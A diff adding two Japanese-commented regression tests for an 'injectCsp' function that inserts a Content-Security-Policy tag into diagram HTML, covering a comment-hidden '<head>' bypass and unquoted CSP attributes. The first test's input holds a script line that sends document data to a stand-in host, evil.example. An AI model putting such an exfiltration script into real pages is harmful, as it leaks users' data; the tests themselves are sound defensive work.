@@ -65,4 +65,31 @@ describe("injectCsp", () => {
     expect(out).not.toContain("default-src *");
     expect(out.match(/http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
   });
+
+  it("HTML コメント内の <head> を誤検出して CSP を挿入しない（脆弱性修正1）", () => {
+    // コメント内に <head> があると、現在の実装はそこに CSP を挿入してしまう。
+    // CSP meta がコメントの中に入って無効化され、コメント外のスクリプトが CSP なしで実行される。
+    const malicious = `<!-- <head> -->
+<script>fetch('https://evil.example/exfil?d=' + document.title)</script>
+<html><head><meta charset="utf-8"></head><body>diagram</body></html>`;
+
+    const out = injectCsp(malicious);
+
+    // CSP は常に文書の先頭に置かれ、コメント外に出ているべき
+    expect(out.startsWith(DIAGRAM_CSP)).toBe(true);
+  });
+
+  it("引用符なし属性値の既存 CSP を除去する（脆弱性修正2）", () => {
+    const html = page(
+      "<div>x</div>",
+      `<meta http-equiv=Content-Security-Policy content="default-src *">`
+    );
+
+    const out = injectCsp(html);
+
+    // 引用符なし CSP が除去されているべき
+    expect(out).not.toContain("default-src *");
+    // Ark の CSP だけが残るべき
+    expect(out.match(/http-equiv=.*Content-Security-Policy/g)).toHaveLength(1);
+  });
 });
